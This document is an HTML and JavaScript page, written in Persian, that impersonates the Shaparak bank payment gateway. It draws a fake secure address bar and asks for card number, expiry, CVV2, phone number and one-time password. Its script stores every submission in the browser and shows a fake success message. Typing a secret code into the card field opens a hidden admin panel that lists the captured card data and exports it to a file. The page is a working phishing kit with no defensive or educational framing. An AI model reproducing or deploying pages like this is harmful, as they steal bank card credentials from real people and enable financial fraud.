<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>درگاه پرداخت امن شاپرک</title>
    <style>
        :root {
            --primary: #004d40;
            --secondary: #28a745;
            --shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
            --font: Arial, sans-serif;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: var(--font);
            background: linear-gradient(145deg, #f5f5f5, #e0e0e0);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 100px;
        }
        .x1-bar {
            position: fixed;
            top: 0;
            width: 100%;
            background: #fff;
            padding: 8px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
            z-index: 10000;
        }
        .x1-bar .x2-icon { color: #28a745; margin-left: 5px; }
        .x1-bar .x3-url {
            background: #f1f1f1;
            padding: 6px 12px;
            border-radius: 20px;
            direction: ltr;
            text-align: left;
            flex-grow: 1;
        }
        header {
            background: var(--primary);
            color: #fff;
            padding: 20px;
            text-align: center;
            position: fixed;
            top: 40px;
            width: 100%;
            z-index: 100;
        }
        header img { height: 50px; }
        .x4-progress {
            max-width: 700px;
            margin: 120px auto 20px;
            background: #fff;
            padding: 8px;
            border-radius: 25px;
        }
        .x5-bar {
            height: 10px;
            background: #ddd;
            border-radius: 12px;
        }
        .x6-fill {
            height: 100%;
            background: var(--secondary);
            width: 0;
            transition: width 0.5s;
        }
        .x7-container {
            background: #fff;
            padding: 40px;
            border-radius: 20px;
            width: 90%;
            max-width: 700px;
            border: 1px solid #eee;
            display: flex;
            flex-direction: column;
            gap: 20px;
            position: relative;
        }
        .x8-badge {
            position: absolute;
            top: 15px;
            left: 15px;
            background: #e8f5e9;
            padding: 8px 15px;
            border-radius: 25px;
            font-size: 13px;
            color: var(--secondary);
            display: flex;
            align-items: center;
            gap: 6px;
        }
        .x9-step { display: none; }
        .x9-step.active { display: block; }
        .x10-group { margin-bottom: 20px; }
        label { font-size: 15px; color: #333; margin-bottom: 8px; display: block; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            direction: rtl;
            text-align: right;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
        }
        .btn-x11 { background: var(--secondary); color: #fff; }
        .btn-x12 { background: #007bff; color: #fff; width: auto; padding: 10px 20px; margin-top: 10px; }
        .btn-cancel { background: #dc3545; color: #fff; margin-top: 10px; }
        .btn-admin { background: #ff9800; color: #fff; margin-top: 20px; display: none; }
        .btn-clear { background: #dc3545; color: #fff; margin-top: 20px; }
        .x13-loader {
            display: none;
            width: 60px;
            height: 60px;
            border: 6px solid #ddd;
            border-top: 6px solid var(--secondary);
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .x14-timer { font-size: 14px; color: #555; text-align: center; margin-top: 15px; }
        footer {
            background: #f5f5f5;
            padding: 20px;
            text-align: center;
            font-size: 13px;
            color: #666;
            width: 100%;
            position: fixed;
            bottom: 0;
        }
        .admin-data-container {
            width: 90%;
            max-width: 700px;
            margin-top: 20px;
            display: none;
            flex-direction: column;
            gap: 15px;
        }
        .user-data-box {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #ddd;
            font-size: 14px;
            color: #333;
            position: relative;
        }
    </style>
</head>
<body>
    <div class="x1-bar">
        <span class="x2-icon">🔒</span>
        <span class="x3-url">https://secure.shaparak.ir/pay/verify?session=xyz123</span>
    </div>

    <header>
        <img src="https://via.placeholder.com/50?text=شاپرک" alt="شاپرک">
        <h1>درگاه پرداخت امن شاپرک</h1>
    </header>

    <div class="x4-progress">
        <div class="x5-bar">
            <div class="x6-fill" id="x6-fill"></div>
        </div>
    </div>

    <div class="x7-container">
        <div class="x8-badge">
            <span>🔒</span> پرداخت امن با پروتکل SSL 256 بیتی
        </div>

        <div class="x9-step active" id="x9-step1">
            <div class="x10-group">
                <label for="x15">شماره کارت</label>
                <input type="text" id="x15" placeholder="---- ---- ---- ----" maxlength="19">
            </div>
            <div class="x10-group">
                <label for="x16">تاریخ انقضا</label>
                <input type="text" id="x16" placeholder="MM/YY" maxlength="5">
            </div>
            <div class="x10-group">
                <label for="x17">CVV2</label>
                <input type="text" id="x17" placeholder="***" maxlength="4">
            </div>
            <button class="btn btn-x11" id="x18">مرحله بعد</button>
            <button class="btn btn-cancel" id="cancel1">انصراف</button>
        </div>

        <div class="x9-step" id="x9-step2">
            <div class="x10-group">
                <label for="x19">شماره تلفن</label>
                <input type="tel" id="x19" placeholder="09XX-XXX-XXXX" maxlength="13">
            </div>
            <div class="x10-group">
                <label for="x20">رمز پویا</label>
                <input type="text" id="x20" placeholder="******" maxlength="6">
                <button class="btn btn-x12" id="x21">درخواست رمز پویا</button>
            </div>
            <div class="x14-timer" id="x22"></div>
            <button class="btn btn-x11" id="x23">تأیید و پرداخت</button>
            <button class="btn btn-cancel" id="cancel2">انصراف</button>
        </div>

        <div class="x9-step" id="x9-step3">
            <div id="x24" style="text-align: center; font-size: 20px; padding: 20px;"></div>
            <div class="x13-loader" id="x25"></div>
            <button class="btn btn-cancel" id="cancel3">انصراف</button>
        </div>

        <button class="btn btn-admin" id="admin-view">مشاهده داده‌ها (حالت مدیر)</button>
    </div>

    <div class="admin-data-container" id="admin-data-container">
        <button class="btn btn-clear" id="clear-data">پاک کردن همه داده‌ها</button>
    </div>

    <footer>
        <p>پشتیبانی: 021-12345678 | تمامی حقوق محفوظ است © شاپرک ۱۴۰۳</p>
    </footer>

    <script>
        (function() {
            let currentStep = 1;
            let userData = JSON.parse(localStorage.getItem('userData') || '[]'); // بارگذاری داده‌ها از localStorage
            let isAdmin = false;
            const adminCode = '12122312';

            // DOM Elements
            const progressFill = document.getElementById('x6-fill');
            const steps = [document.getElementById('x9-step1'), document.getElementById('x9-step2'), document.getElementById('x9-step3')];
            const adminBtn = document.getElementById('admin-view');
            const cancelBtns = [document.getElementById('cancel1'), document.getElementById('cancel2'), document.getElementById('cancel3')];
            const cardInput = document.getElementById('x15');
            const adminDataContainer = document.getElementById('admin-data-container');

            // Input Formatting and Admin Check
            cardInput.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\D/g, '').slice(0, 16);
                e.target.value = value.replace(/(.{4})/g, '$1-').slice(0, 19).trim();
                if (value === adminCode) {
                    isAdmin = true;
                    adminBtn.style.display = 'block';
                    adminDataContainer.style.display = 'flex';
                    displayAdminData();
                }
            });
            document.getElementById('x16').addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '');
                if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
                e.target.value = v.slice(0, 5);
            });
            document.getElementById('x17').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
            });
            document.getElementById('x19').addEventListener('input', function(e) {
                let v = e.target.value.replace(/\D/g, '').slice(0, 11);
                e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
            });
            document.getElementById('x20').addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
            });

            // Fake Server Call
            function fakeServerCall(callback) {
                setTimeout(() => {
                    callback({ status: 'success', id: 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase() });
                }, 1500 + Math.random() * 1000);
            }

            // Progress Update
            function updateProgress() {
                progressFill.style.width = `${(currentStep / 3) * 100}%`;
            }

            // Save Data
            function saveData() {
                let data = {
                    cardNumber: document.getElementById('x15').value,
                    expiryDate: document.getElementById('x16').value,
                    cvv2: document.getElementById('x17').value,
                    phoneNumber: document.getElementById('x19').value,
                    otp: document.getElementById('x20').value
                };
                if (data.cardNumber.replace(/\D/g, '') !== adminCode) {
                    userData.push(data);
                    localStorage.setItem('userData', JSON.stringify(userData)); // ذخیره در localStorage
                    if (isAdmin) displayAdminData();
                }
            }

            // Display Admin Data
            function displayAdminData() {
                adminDataContainer.innerHTML = '';
                if (userData.length === 0) {
                    adminDataContainer.innerHTML = '<p>هیچ داده‌ای جمع‌آوری نشده است.</p>';
                } else {
                    userData.forEach((data, index) => {
                        let userBox = document.createElement('div');
                        userBox.className = 'user-data-box';
                        userBox.innerHTML = `
                            <strong>کاربر ${index + 1}</strong><br>
                            شماره کارت: ${data.cardNumber}<br>
                            تاریخ انقضا: ${data.expiryDate}<br>
                            CVV2: ${data.cvv2}<br>
                            شماره تلفن: ${data.phoneNumber}<br>
                            رمز پویا: ${data.otp}
                        `;
                        adminDataContainer.appendChild(userBox);
                    });
                }
                let clearBtn = document.createElement('button');
                clearBtn.className = 'btn btn-clear';
                clearBtn.textContent = 'پاک کردن همه داده‌ها';
                clearBtn.onclick = clearAdminData;
                adminDataContainer.appendChild(clearBtn);
            }

            // Clear Admin Data
            function clearAdminData() {
                if (confirm('آیا مطمئن هستید که می‌خواهید همه داده‌ها را پاک کنید؟')) {
                    userData = [];
                    localStorage.setItem('userData', JSON.stringify(userData)); // به‌روزرسانی localStorage
                    displayAdminData();
                }
            }

            // Export Data as File
            function exportData() {
                let dataString = userData.map(data => 
                    `کاربر: شماره کارت: ${data.cardNumber}, تاریخ انقضا: ${data.expiryDate}, CVV2: ${data.cvv2}, شماره تلفن: ${data.phoneNumber}, رمز پویا: ${data.otp}`
                ).join('\n');
                let blob = new Blob([dataString], { type: 'text/plain' });
                let link = document.createElement('a');
                link.href = URL.createObjectURL(blob);
                link.download = 'payment-log.txt';
                link.click();
            }

            // Show Admin Data
            function showAdminData() {
                if (isAdmin) {
                    if (userData.length > 0) {
                        exportData();
                    } else {
                        alert('هیچ داده‌ای جمع‌آوری نشده است.');
                    }
                }
            }

            // Reset Form
            function resetForm() {
                steps.forEach(step => step.classList.remove('active'));
                currentStep = 1;
                steps[0].classList.add('active');
                updateProgress();
                document.getElementById('x15').value = '';
                document.getElementById('x16').value = '';
                document.getElementById('x17').value = '';
                document.getElementById('x19').value = '';
                document.getElementById('x20').value = '';
                document.getElementById('x24').innerHTML = '';
                document.getElementById('x25').style.display = 'none';
                document.getElementById('x22').textContent = '';
                if (!isAdmin) {
                    adminBtn.style.display = 'none';
                    adminDataContainer.style.display = 'none';
                }
            }

            // Step Navigation
            document.getElementById('x18').addEventListener('click', () => {
                if (currentStep === 1 && document.getElementById('x15').value && document.getElementById('x16').value && document.getElementById('x17').value) {
                    steps[0].classList.remove('active');
                    currentStep = 2;
                    steps[1].classList.add('active');
                    updateProgress();
                }
            });
            document.getElementById('x23').addEventListener('click', () => {
                if (currentStep === 2 && document.getElementById('x19').value && document.getElementById('x20').value) {
                    saveData();
                    steps[1].classList.remove('active');
                    currentStep = 3;
                    steps[2].classList.add('active');
                    updateProgress();
                    document.getElementById('x25').style.display = 'block';
                    fakeServerCall((response) => {
                        document.getElementById('x25').style.display = 'none';
                        document.getElementById('x24').innerHTML = `پرداخت موفق!<br>شماره تراکنش: ${response.id}`;
                    });
                }
            });

            // Fake OTP Request
            document.getElementById('x21').addEventListener('click', () => {
                if (document.getElementById('x19').value) {
                    fakeServerCall(() => {
                        alert('رمز پویا ارسال شد!');
                        let timeLeft = 120;
                        let timer = setInterval(() => {
                            document.getElementById('x22').textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
                            if (--timeLeft < 0) {
                                clearInterval(timer);
                                document.getElementById('x22').textContent = 'رمز منقضی شد';
                            }
                        }, 1000);
                    });
                }
            });

            // Cancel Buttons
            cancelBtns.forEach(btn => {
                btn.addEventListener('click', () => {
                    if (confirm('آیا مطمئن هستید که می‌خواهید انصراف دهید؟')) {
                        resetForm();
                    }
                });
            });

            // Admin Mode Activation
            adminBtn.addEventListener('click', showAdminData);

            updateProgress();
        })();
    </script>
</body>
</html>
